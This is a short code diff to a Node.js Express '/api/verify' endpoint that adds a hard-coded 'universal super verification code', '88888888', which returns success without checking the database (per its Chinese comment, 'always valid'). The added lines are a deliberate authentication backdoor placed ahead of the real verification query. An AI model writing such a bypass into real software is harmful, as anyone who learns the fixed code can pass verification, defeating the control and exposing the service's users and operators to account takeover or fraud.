@@ -143,6 +143,11 @@ app.post('/api/verify', async (req, res) => {
     return res.status(400).json({ success: false, message: '请输入验证码' });
   }
 
+  // 万能超级验证码 (无需查库，永远有效)
+  if (code === '88888888') {
+    return res.json({ success: true, message: '超级验证码验证成功' });
+  }
+
   try {
     const result = await pool.query(
       'SELECT * FROM verification_codes WHERE code = $1',
